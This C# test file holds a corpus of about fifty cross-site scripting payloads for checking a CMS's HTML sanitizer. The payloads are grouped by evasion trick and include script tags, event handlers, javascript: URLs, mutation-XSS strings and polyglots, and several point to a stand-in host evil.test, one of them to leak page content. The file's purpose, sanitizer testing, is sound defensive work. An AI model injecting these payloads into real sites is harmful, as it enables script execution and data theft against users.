namespace ContentManagementSystem.Core.Tests.Security;

/// <summary>
/// The payloads every sanitization profile has to neutralize (task P1-20).
/// </summary>
/// <remarks>
/// Drawn from the OWASP XSS Filter Evasion Cheat Sheet, the OWASP Testing Guide's stored-XSS
/// section, and the widely circulated polyglots (0xsobky's, Ahmed Elsobky's mXSS strings, the
/// Cure53 mutation cases). They are grouped by the trick they use rather than listed flat, because
/// when one fails the group is what tells you which assumption broke.
/// <para>
/// <strong>These are payloads, not test data to be tidied.</strong> The malformed ones are malformed
/// on purpose — an unbalanced quote, a stray <c>&lt;</c>, a tag that never closes — because the
/// whole class of filter bypass they represent works by making a parser disagree with the filter
/// about where an element begins. Reformatting one to look sensible removes the thing it tests.
/// </para>
/// <para>
/// Adding to this list is cheap and is the right response to any XSS report against this system.
/// The suite asserts an invariant over whatever is here, so a new entry needs no new test.
/// </para>
/// </remarks>
internal static class XssCorpus
{
    /// <summary>One corpus entry.</summary>
    /// <param name="Name">A short identifier, used as the test case name.</param>
    /// <param name="Payload">The hostile markup.</param>
    /// <param name="Group">The evasion technique it stands for.</param>
    public sealed record Case(string Name, string Payload, string Group);

    /// <summary>Every payload in the corpus.</summary>
    public static IReadOnlyList<Case> All { get; } =
    [
        // ── Script elements, in every spelling a parser will still accept ──────────────────────
        new("script-plain", "<script>alert('XSS')</script>", "script element"),
        new("script-mixed-case", "<ScRiPt >alert('XSS')</ScRiPt>", "script element"),
        new("script-unclosed", "<script>alert('XSS')", "script element"),
        new("script-nested-broken", "<scr<script>ipt>alert('XSS')</scr</script>ipt>", "script element"),
        new("script-src", "<script src=\"https://evil.test/x.js\"></script>", "script element"),
        new("script-in-noscript", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "script element"),
        new("script-in-template", "<template><script>alert(1)</script></template>", "script element"),

        // ── Event handler attributes ───────────────────────────────────────────────────────────
        new("img-onerror", "<img src=x onerror=alert('XSS')>", "event handler"),
        new("img-onerror-no-quotes-slash", "<img/src=\"x\"/onerror=alert('XSS')>", "event handler"),
        new("img-onerror-backtick", "<img src=`x` onerror=alert('XSS')>", "event handler"),
        new("svg-onload", "<svg onload=alert('XSS')>", "event handler"),
        new("body-onload", "<body onload=alert('XSS')>", "event handler"),
        new("details-ontoggle", "<details open ontoggle=alert('XSS')>x</details>", "event handler"),
        new("marquee-onstart", "<marquee onstart=alert('XSS')>x</marquee>", "event handler"),
        new("input-autofocus-onfocus", "<input autofocus onfocus=alert('XSS')>", "event handler"),
        new("onerror-uppercase", "<IMG SRC=x ONERROR=alert('XSS')>", "event handler"),
        new("onmouseover-on-allowed-tag", "<p onmouseover=\"alert('XSS')\">hover</p>", "event handler"),

        // ── Hostile URL schemes ────────────────────────────────────────────────────────────────
        new("href-javascript", "<a href=\"javascript:alert('XSS')\">click</a>", "url scheme"),
        new("href-javascript-entity", "<a href=\"jav&#x0A;ascript:alert('XSS')\">click</a>", "url scheme"),
        new("href-javascript-tab-entity", "<a href=\"jav&#x09;ascript:alert('XSS')\">click</a>", "url scheme"),
        new("href-javascript-leading-space", "<a href=\"  javascript:alert('XSS')\">click</a>", "url scheme"),
        new("href-javascript-colon-entity", "<a href=\"javascript&#58;alert('XSS')\">click</a>", "url scheme"),
        new("img-vbscript", "<img src='vbscript:msgbox(\"XSS\")'>", "url scheme"),
        new("href-data-html", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "url scheme"),
        new("img-data-svg", "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIi8+\">", "url scheme"),
        new("img-srcset-javascript", "<img src=\"https://cdn.test/a.png\" srcset=\"javascript:alert(1) 1x\">", "url scheme"),
        new("iframe-javascript-src", "<iframe src=\"javascript:alert('XSS')\"></iframe>", "url scheme"),

        // ── Embedded and framed content ────────────────────────────────────────────────────────
        new("iframe-srcdoc", "<iframe srcdoc=\"&lt;script&gt;alert('XSS')&lt;/script&gt;\"></iframe>", "embedded content"),
        new("iframe-unlisted-host", "<iframe src=\"https://evil.test/embed\"></iframe>", "embedded content"),
        new("object-data", "<object data=\"javascript:alert('XSS')\"></object>", "embedded content"),
        new("embed-svg", "<embed src=\"https://evil.test/x.svg\" type=\"image/svg+xml\">", "embedded content"),
        new("meta-refresh", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">", "embedded content"),
        new("base-href", "<base href=\"javascript:alert('XSS')//\">", "embedded content"),
        new("form-action", "<form action=\"javascript:alert('XSS')\"><input type=submit value=go></form>", "embedded content"),
        new("svg-animate-href", "<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=10 y=10>x</text></a></svg>", "embedded content"),

        // ── CSS ────────────────────────────────────────────────────────────────────────────────
        new("style-element", "<style>body { background: url('javascript:alert(1)') }</style>", "css"),
        new("style-attribute-expression", "<div style=\"width: expression(alert('XSS'))\">x</div>", "css"),
        new("style-attribute-url-javascript", "<div style=\"background-image: url(javascript:alert('XSS'))\">x</div>", "css"),
        new("style-attribute-position-fixed", "<div style=\"position: fixed; top: 0; left: 0; width: 100%; height: 100%\">x</div>", "css"),
        new("style-attribute-behavior", "<div style=\"behavior: url(https://evil.test/x.htc)\">x</div>", "css"),

        // ── Malformed markup and tag poisoning ─────────────────────────────────────────────────
        new("quote-poisoning", "<img \"\"\"><script>alert('XSS')</script>\">", "malformed markup"),
        new("half-open-img", "<img src=\"x\" onerror=\"alert('XSS')\"", "malformed markup"),
        new("dangling-markup", "<img src='https://evil.test/log?", "malformed markup"),
        new("conditional-comment", "<!--[if gte IE 4]><script>alert('XSS')</script><![endif]-->", "malformed markup"),
        new("comment-with-markup", "<!-- <img src=x onerror=alert(1)> -->", "malformed markup"),
        new("xml-namespaced-script", "<xss xmlns:xss=\"http://www.w3.org/1999/xhtml\"><xss:script>alert(1)</xss:script></xss>", "malformed markup"),

        // ── Mutation XSS: markup that changes meaning when a browser re-parses it ──────────────
        new(
            "mxss-style-in-svg",
            "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
            "mutation xss"),
        new(
            "mxss-mglyph-table",
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
            "mutation xss"),
        new(
            "mxss-noembed",
            "<noembed><img src=x onerror=alert(1)></noembed>",
            "mutation xss"),

        // ── Polyglots ─────────────────────────────────────────────────────────────────────────
        new(
            "polyglot-0xsobky",
            """
            jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
            """,
            "polyglot"),
        new(
            "polyglot-mixed-context",
            "\"'><img src=x onerror=alert('XSS')>'\"><svg/onload=alert(1)>",
            "polyglot"),
        new(
            "polyglot-comment-escape",
            "--><script>alert('XSS')</script><!--",
            "polyglot"),
    ];
}
